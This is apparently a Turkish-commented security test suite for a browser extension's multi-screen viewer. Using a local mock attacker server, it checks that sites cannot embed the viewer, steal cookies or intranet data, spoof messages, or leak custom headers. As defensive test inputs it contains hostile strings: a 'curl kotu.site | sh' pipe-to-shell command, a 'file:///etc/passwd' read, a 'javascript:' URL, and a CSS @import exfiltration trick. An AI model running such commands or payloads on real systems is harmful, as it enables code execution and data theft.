/**
 * GÜVENLİK TESTLERİ
 *
 * A. Web siteleri stüdyo sayfasını (viewer.html) yükleyemez/gömemez
 * B. Service worker ayrıcalıklı komutlarda adres şemasını denetler
 * C. Stüdyo mesaj kanalı: sahte gönderen ve keyfi pano metni elenir
 * D. Stüdyo sekmesi başka adrese gidince header kuralları kalkar
 * E. Normal sekmedeki site sahte yükle köprüyü çalıştırıp başka adres okuyamaz
 * F. Özel başlıklar yalnızca önizlenen sitenin alan adına gider
 * G. Özel başlıklar panel açılmadan yeni oturumda da uygulanır
 * H. Yüklenemeyen ekranda kullanıcıya uyarı gösterilir
 * I. Senkron gezinme kapalıyken başka siteye giden ekran emülasyonu korur
 */
import { createServer } from 'node:http'
import { Session, sleep, karelerHazir, karelerHazirTab, targets } from './cdp.mjs'

/* Saldırgan + "gizli/intranet" kaynak + başlık yankısı — 8897 */
const yuk = encodeURIComponent(JSON.stringify({ token: 'saldirgan', fid: 'f1', touchMode: true, colorScheme: 'auto' }))
const sunucu = createServer((q, r) => {
  const u = new URL(q.url, 'http://x')
  const cors = { 'access-control-allow-origin': '*' }
  if (u.pathname === '/setcookie') { r.writeHead(200, { 'set-cookie': 'oturum=GIZLI_OTURUM; SameSite=None; Secure; Path=/' }); return r.end('ok') }
  if (u.pathname === '/gizli') { r.writeHead(200, { 'content-type': 'application/json' }); return r.end(JSON.stringify({ gizli: 'INTRANET_VERISI', cerez: q.headers.cookie ?? null })) }
  if (u.pathname === '/kotu.css') { r.writeHead(200, { 'content-type': 'text/css' }); return r.end('@import url("http://localhost:8897/gizli");\na:hover{color:red}') }
  if (u.pathname === '/cerceve.html') { r.writeHead(200, { 'content-type': 'text/html' }); return r.end('<link rel="stylesheet" href="http://localhost:8897/kotu.css"><a href="#">x</a>') }
  if (u.pathname === '/saldiri.html') { r.writeHead(200, { 'content-type': 'text/html' }); return r.end(`<iframe id="f" src="http://127.0.0.1:8897/cerceve.html#__rs=${yuk}"></iframe>`) }
  if (u.pathname === '/baslik') { r.writeHead(200, { 'content-type': 'application/json', ...cors }); return r.end(JSON.stringify({ auth: q.headers.authorization ?? null })) }
  r.writeHead(404); r.end()
}).listen(8897)
const EXT = 'ocnniomdddfffmfbpocmhdjbdmpnkhjn'
const ok = (b) => b ? '✓' : '✗'
let hepsi = true
const kontrol = (ad, kosul, ek = '') => { hepsi &&= kosul; console.log(` ${ok(kosul)} ${ad}${ek ? ' — ' + ek : ''}`) }
const yeni = async (url) => (await fetch(`http://127.0.0.1:9222/json/new?${encodeURIComponent(url)}`, { method: 'PUT' })).json()
const oturum = async (t) => { const s = new Session(t.webSocketDebuggerUrl); await s.connect(); await s.send('Runtime.enable'); return s }

for (const t of await targets())
  if (t.url.includes('viewer.html')) await fetch(`http://127.0.0.1:9222/json/close/${t.id}`)

/* ── A. Web erişilebilir kaynaklar ── */
console.log('\n── A. viewer.html sitelere kapalı ──')
const site = await yeni('http://localhost:8899/')
await sleep(1500)
const s = await oturum(site)
const war = await s.eval(`(async () => {
  const dene = async (u) => { try { const r = await fetch(u); return r.ok } catch { return false } }
  const ifr = await new Promise((res) => {
    const f = document.createElement('iframe')
    f.src = 'chrome-extension://${EXT}/viewer.html?url=https://example.com'
    f.onload = () => { let erisim; try { erisim = f.contentWindow.location.href } catch { erisim = 'cross' } res(erisim) }
    document.body.appendChild(f)
    setTimeout(() => res('zaman'), 4000)
  })
  return {
    viewer: await dene('chrome-extension://${EXT}/viewer.html'),
    js: await dene('chrome-extension://${EXT}/assets/viewer.js'),
    axe: await dene('chrome-extension://${EXT}/axe.min.js'),
    ifr,
  }
})()`)
kontrol('site viewer.html dosyasını okuyamıyor', war.viewer === false)
kontrol('site viewer.js dosyasını okuyamıyor', war.js === false)
kontrol('axe.min.js hâlâ erişilebilir (denetim için gerekli)', war.axe === true)
s.close(); await fetch(`http://127.0.0.1:9222/json/close/${site.id}`)
await sleep(500)
const gomulu = (await targets()).filter((t) => t.url.includes('viewer.html'))
kontrol('gömülen viewer çalışmadı (hedef oluşmadı)', gomulu.length === 0, `${gomulu.length} hedef`)

/* ── B. Service worker komut doğrulaması ── */
console.log('\n── B. Service worker ──')
const tab = await yeni(`chrome-extension://${EXT}/viewer.html?url=${encodeURIComponent('http://localhost:8899/')}`)
await sleep(1200); await karelerHazirTab(tab); await sleep(800)
const p = await oturum(tab)
const bg = (m) => p.eval(`new Promise((r) => chrome.runtime.sendMessage(${JSON.stringify(m)}, r))`)
const kurallar = () => p.eval(`chrome.declarativeNetRequest.getSessionRules().then((r) => r.map((x) => ({ id: x.id, tabs: x.condition.tabIds })))`)

const k1 = await kurallar()
const tabId = await p.eval(`new Promise((r) => chrome.tabs.getCurrent((t) => r(t.id)))`)
kontrol('header kuralı stüdyo sekmesine uygulandı', k1.some((r) => r.id === 1000 && r.tabs?.includes(tabId)), JSON.stringify(k1))
const f1 = await bg({ t: 'fetch', url: 'file:///etc/passwd', text: true })
kontrol('fetch: file:// reddedildi', f1?.ok === false, f1?.error)
const f2 = await bg({ t: 'fetch', url: 'http://localhost:8899/', text: true })
kontrol('fetch: http çalışıyor', f2?.ok === true && f2.status === 200)
const o1 = await bg({ t: 'openTab', url: 'javascript:alert(1)' })
kontrol('openTab: javascript: reddedildi', o1?.ok === false)
await p.send('Page.bringToFront'); await sleep(300)
const c1 = await bg({ t: 'captureVisible' })
kontrol('ekran görüntüsü stüdyo öndeyken alınıyor', c1?.ok === true && String(c1.dataUrl).startsWith('data:image/png'), c1?.error)

/* ── C. Stüdyo mesaj kanalı ── */
console.log('\n── C. Mesaj kanalı ──')
const kare = (await targets()).find((t) => t.type === 'iframe' && t.url.startsWith('http://localhost:8899'))
const k = await oturum(kare)
const toastVar = (metin) => p.eval(`document.body.innerText.includes(${JSON.stringify(metin)})`)
/* Kare kendi adına geçerli renk → kabul (pozitif kontrol) */
await k.eval(`(() => { const c = JSON.parse(window.name.slice('__RSTUDIO__'.length));
  window.top.postMessage({ __rs: c.token, m: { t: 'color', fid: c.fid, hex: '#abcdef' } }, '*') })()`)
await sleep(500)
kontrol('kare kendi penceresinden mesaj gönderebiliyor', await toastVar('#abcdef'))
/* Kare panoya keyfi metin koymaya çalışıyor → ret */
await k.eval(`(() => { const c = JSON.parse(window.name.slice('__RSTUDIO__'.length));
  window.top.postMessage({ __rs: c.token, m: { t: 'color', fid: c.fid, hex: 'curl kotu.site | sh' } }, '*') })()`)
await sleep(500)
kontrol('panoya keyfi metin yazılamıyor', !(await toastVar('curl kotu.site')))
/* Sitenin içindeki iç içe iframe, jetonu bilse bile kare adına konuşamaz */
await k.eval(`new Promise((res) => { const c = JSON.parse(window.name.slice('__RSTUDIO__'.length));
  const f = document.createElement('iframe'); f.srcdoc = '<p>reklam</p>'
  f.onload = () => { f.contentWindow.eval("top.postMessage({ __rs: " + JSON.stringify(c.token) + ", m: { t: 'color', fid: " + JSON.stringify(c.fid) + ", hex: '#123456' } }, '*')"); setTimeout(res, 300) }
  document.body.appendChild(f) })`)
await sleep(500)
kontrol('iç içe iframe kare adına mesaj gönderemiyor', !(await toastVar('#123456')))
k.close()

/* ── D. Sekme başka adrese gidince kurallar kalkar ── */
console.log('\n── D. Kural temizliği ──')
const sw = (await targets()).find((t) => t.type === 'service_worker' && t.url.includes(EXT))
const w = await oturum(sw)
await p.send('Page.navigate', { url: 'http://localhost:8899/' })
await sleep(2000)
const k2 = await w.eval(`chrome.declarativeNetRequest.getSessionRules().then((r) => r.map((x) => x.id))`)
kontrol('stüdyo sekmesi siteye gidince header kuralları kaldırıldı', k2.length === 0, JSON.stringify(k2))
const cs = await w.eval(`chrome.scripting.getRegisteredContentScripts().then((r) => r.length)`)
kontrol('content script kayıtları kaldırıldı', cs === 0, `${cs} kayıt`)
w.close(); p.close()
await fetch(`http://127.0.0.1:9222/json/close/${tab.id}`)

/* ── E. Normal sekmeden sahte yükle veri okuma ── */
console.log('\n── E. Normal sekme saldırısı ──')
const ck = await yeni('http://localhost:8897/setcookie'); await sleep(800)
const v2 = await yeni(`chrome-extension://${EXT}/viewer.html?url=${encodeURIComponent('http://localhost:8899/')}`)
await sleep(1200); await karelerHazirTab(v2)
const kotu = await yeni('http://127.0.0.1:8897/saldiri.html'); await sleep(5000)
const ks = await oturum(kotu)
const sizinti = await ks.eval(`(() => { const d = document.getElementById('f').contentDocument;
  return { stil: [...d.querySelectorAll('style')].map((x) => x.textContent).join(' '),
           kopru: !!d.defaultView.__rsPageBridge, ad: d.defaultView.name.slice(0, 11) } })()`)
kontrol('başka adresin içeriği okunamadı', !sizinti.stil.includes('INTRANET_VERISI'))
kontrol('oturum çerezi okunamadı', !sizinti.stil.includes('GIZLI_OTURUM'))
kontrol('sahte yükle köprü/emülasyon başlamadı', !sizinti.kopru && sizinti.ad !== '__RSTUDIO__', JSON.stringify({ kopru: sizinti.kopru, ad: sizinti.ad }))
ks.close()
for (const t of [ck, kotu]) await fetch(`http://127.0.0.1:9222/json/close/${t.id}`)

/* ── F. Özel başlıklar yalnızca sitenin alan adına ── */
console.log('\n── F. Özel başlık kapsamı ──')
const p2 = await oturum(v2)
const bg2 = (m) => p2.eval(`new Promise((r) => chrome.runtime.sendMessage(${JSON.stringify(m)}, r))`)
await bg2({ t: 'setCustomHeaders', host: 'localhost', headers: [{ name: 'Authorization', value: 'Basic dGVzdDpnaXpsaQ==' }] })
await sleep(300)
const kare2 = (await targets()).find((t) => t.type === 'iframe' && t.url.startsWith('http://localhost:8899'))
const k2s = await oturum(kare2)
const ayni = await k2s.eval(`fetch('http://localhost:8897/baslik').then((r) => r.json())`)
const ucuncu = await k2s.eval(`fetch('http://127.0.0.1:8897/baslik').then((r) => r.json())`)
kontrol('başlık sitenin alan adına gidiyor', ayni.auth === 'Basic dGVzdDpnaXpsaQ==', JSON.stringify(ayni))
kontrol('başlık üçüncü taraf alan adına sızmıyor', ucuncu.auth === null, JSON.stringify(ucuncu))
k2s.close()

/* ── G. Yeni oturumda panel açılmadan başlıklar uygulanır ── */
console.log('\n── G. Başlıklar yeni oturumda ──')
await p2.eval(`chrome.storage.local.get('rs_state_v1').then((g) => { const s = g.rs_state_v1 ?? {};
  s.settings = { ...(s.settings ?? {}), customHeaders: [{ id: 'hT', name: 'X-Test-Baslik', value: 'oturum-sonrasi', enabled: true }] };
  return chrome.storage.local.set({ rs_state_v1: s }) })`)
p2.close(); await fetch(`http://127.0.0.1:9222/json/close/${v2.id}`); await sleep(800)
const v3 = await yeni(`chrome-extension://${EXT}/viewer.html?url=${encodeURIComponent('http://localhost:8899/')}`)
await sleep(1200); await karelerHazirTab(v3); await sleep(500)
const p3 = await oturum(v3)
/* Başlık kuralı viewer açılışından kısa süre sonra kurulur — bir kez yenile */
await p3.eval(`document.querySelector('button[title^="Tümünü yenile"]').click()`)
await sleep(1000); await karelerHazir(p3)
const kare3 = (await targets()).find((t) => t.type === 'iframe' && t.url.startsWith('http://localhost:8899'))
const k3s = await oturum(kare3)
const hdr3 = await k3s.eval(`document.getElementById('hdr')?.textContent ?? ''`)
kontrol('kayıtlı başlık panel açılmadan gönderildi', hdr3.includes('oturum-sonrasi'), hdr3)
k3s.close()
await p3.eval(`chrome.storage.local.get('rs_state_v1').then((g) => { const s = g.rs_state_v1; s.settings.customHeaders = []; return chrome.storage.local.set({ rs_state_v1: s }) })`)

/* ── H. Yüklenemeyen ekran uyarısı ── */
console.log('\n── H. Yükleme hatası uyarısı ──')
p3.close(); await fetch(`http://127.0.0.1:9222/json/close/${v3.id}`)
const v4 = await yeni(`chrome-extension://${EXT}/viewer.html?url=${encodeURIComponent('http://localhost:9/')}`)
const p4 = await oturum(v4)
await sleep(17000)
const uyari = await p4.eval(`({ n: document.querySelectorAll('.frame-warn').length, ekran: document.querySelectorAll('.frame').length,
  metin: document.querySelector('.frame-warn')?.innerText ?? '' })`)
kontrol('kapalı sunucuda her ekranda uyarı var', uyari.n > 0 && uyari.n === uyari.ekran, `${uyari.n}/${uyari.ekran}`)
p4.close(); await fetch(`http://127.0.0.1:9222/json/close/${v4.id}`)

/* ── I. Tek ekran gezinmesi ── */
console.log('\n── I. Tek ekran gezinmesi ──')
const v5 = await yeni(`chrome-extension://${EXT}/viewer.html?url=${encodeURIComponent('http://localhost:8899/')}`)
await sleep(1200); await karelerHazirTab(v5)
const p5 = await oturum(v5)
const gezinmeAcik = await p5.eval(`document.querySelector('button[title^="Bir ekranda bağlantıya"]').classList.contains('on')`)
if (gezinmeAcik) await p5.eval(`document.querySelector('button[title^="Bir ekranda bağlantıya"]').click()`)
await sleep(500)
/* İlk mobil ekranda başka kökene (127.0.0.1) giden bir bağlantıya tıkla */
let mobil = null
for (const t of (await targets()).filter((t) => t.type === 'iframe' && t.url.startsWith('http://localhost:8899'))) {
  const s = await oturum(t)
  if (await s.eval(`innerWidth < 500`)) { mobil = s; break }
  s.close()
}
await mobil.eval(`(() => { const a = document.createElement('a'); a.href = 'http://127.0.0.1:8899/sayfa2.html'; a.textContent = 'git';
  document.body.appendChild(a); a.click() })()`)
mobil.close()
await sleep(3000)
const yeniKare = (await targets()).find((t) => t.type === 'iframe' && t.url.startsWith('http://127.0.0.1:8899/sayfa2.html'))
let durum = null
if (yeniKare) { const s = await oturum(yeniKare)
  durum = await s.eval(`({ w: innerWidth, mobil: /iPhone|Android/.test(navigator.userAgent), dokunma: navigator.maxTouchPoints > 0, ad: window.name.slice(0, 11) })`); s.close() }
kontrol('başka siteye geçen ekran mobil emülasyonu korudu', !!durum && durum.mobil && durum.dokunma && durum.w < 500, JSON.stringify(durum))
kontrol('diğer ekranlar yerinde kaldı', (await targets()).filter((t) => t.type === 'iframe' && t.url.startsWith('http://localhost:8899')).length >= 5)
if (gezinmeAcik) await p5.eval(`document.querySelector('button[title^="Bir ekranda bağlantıya"]').click()`)
await sleep(500)
p5.close(); await fetch(`http://127.0.0.1:9222/json/close/${v5.id}`)
sunucu.close()

console.log(hepsi ? '\n✅ GÜVENLİK TESTLERİ GEÇTİ' : '\n❌ GÜVENLİK TESTLERİNDE HATA')
process.exit(hepsi ? 0 : 1)
